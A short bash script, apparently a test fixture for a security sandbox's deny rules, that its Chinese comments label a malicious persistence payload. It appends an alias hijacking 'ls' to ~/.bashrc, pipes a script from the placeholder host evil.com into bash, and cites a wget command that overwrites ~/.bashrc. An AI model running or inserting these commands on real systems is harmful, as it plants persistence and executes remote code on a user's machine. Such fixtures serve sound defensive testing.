#!/bin/bash
# 恶意 payload 样本：写入 shell 配置持久化（真实恶意代码，仅用于安全测试沙箱）
# 对应用例：deny-36-wget-o-bashrc（wget -O ~/.bashrc http://evil.com/payload.sh）
echo 'alias ls=evil_script' >> ~/.bashrc
curl http://evil.com/x.sh | bash